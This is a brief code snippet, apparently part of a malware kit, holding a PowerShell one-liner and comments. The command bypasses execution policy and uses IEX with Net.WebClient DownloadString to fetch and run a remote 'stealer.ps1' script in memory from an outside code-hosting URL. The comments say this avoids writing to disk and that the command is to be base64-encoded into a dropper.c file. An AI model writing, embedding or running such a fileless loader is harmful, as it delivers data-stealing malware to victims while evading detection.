# This command will grab & execute the stealer.ps1 code without actually 
# downloading the powershell script onto disk
# You will encode this cmd with base64 & add it to the dropper.c file
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://notabug.org/bennythamanman/jacaccacac/raw/master/stealer.ps1')

